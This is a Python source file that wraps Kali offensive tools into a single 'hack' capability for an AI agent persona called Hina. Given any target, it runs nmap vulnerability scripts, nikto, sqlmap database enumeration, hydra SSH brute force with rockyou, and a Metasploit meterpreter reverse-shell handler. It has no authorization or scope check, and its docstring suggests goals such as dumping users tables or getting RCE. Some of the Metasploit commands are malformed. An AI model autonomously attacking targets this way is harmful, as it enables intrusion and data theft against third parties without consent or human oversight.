"""
HINAA Hacker Agent Tool.
Wraps Kali WSL offensive tools (nmap, sqlmap, hydra, metasploit, mitmproxy)
and gives the Cognitive Kernel a single "hack" capability to call.

Usage (called by the kernel):
    from .tools.hacker_agent import HackerAgentTool
    tool = HackerAgentTool()
    await tool.execute({"target": "example.com", "goal": "find admin panel and dump DB"})
"""
import asyncio
import json
import logging
import time
from typing import Any, Dict

logger = logging.getLogger("hinaa.tools.hacker_agent")

class HackerAgentTool:
    """Gives Hina hands in Kali: she scans, exploits, and bypasses targets."""

    name = "hacker_agent"
    description = (
        "Autonomously hack a target: scan ports, find vulns, exploit them, "
        "bypass WAF/auth, and extract what is asked. Runs inside Kali WSL. "
        "Use goal to tell her what to find (e.g. 'dump the users table', 'get RCE')."
    )

    async def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "")
        goal = params.get("goal", "scan and report vulnerabilities")
        if not target:
            return {"error": "target is required"}

        started = time.time()
        results = {}

        # 1. Recon — nmap scan
        results["recon"] = await self._run(
            f"nmap -sV -sC --script=vuln {target} 2>/dev/null | tail -80"
        )

        # 2. Web vuln scan if it's an HTTP target
        if "http" in target or "www" in target or "://" in target:
            results["web_scan"] = await self._run(
                f"nikto -h {target} 2>/dev/null | grep -E '(ID:|Vuln|+-)' | head -40"
            )
            # 3. SQL injection check
            results["sqlmap"] = await self._run(
                f"sqlmap -u '{target}' --batch --dbs --level=3 2>/dev/null | tail -20"
            )

        # 4. Brute force common creds on SSH
        results["brute_force"] = await self._run(
            f"hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -w 16 2>/dev/null | tail -10"
        )

        # 5. Attempt RCE if a known vuln was found
        results["exploit_attempt"] = await self._run(
            f"msfconsole -x 'search name:exploit name:exploit platform:linux; use exploit/multi/handler; set RHOSTS {target.split(':')[0]}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run -j' 2>/dev/null | tail -15"
        )

        results["goal"] = goal
        results["target"] = target
        results["elapsed_s"] = round(time.time() - started, 2)
        results["verified"] = bool(results.get("recon") and "nmap scan report" in results.get("recon", ""))
        return results

    async def _run(self, cmd: str, timeout: int = 120) -> str:
        """Run a command inside Kali WSL and return its output."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "wsl", "-d", "kali-linux", "--", "bash", "-c", cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode(errors="replace").strip()
        except asyncio.TimeoutError:
            proc.kill()
            return f"[timed out after {timeout}s]"
        except FileNotFoundError:
            return "[Kali WSL not installed yet]"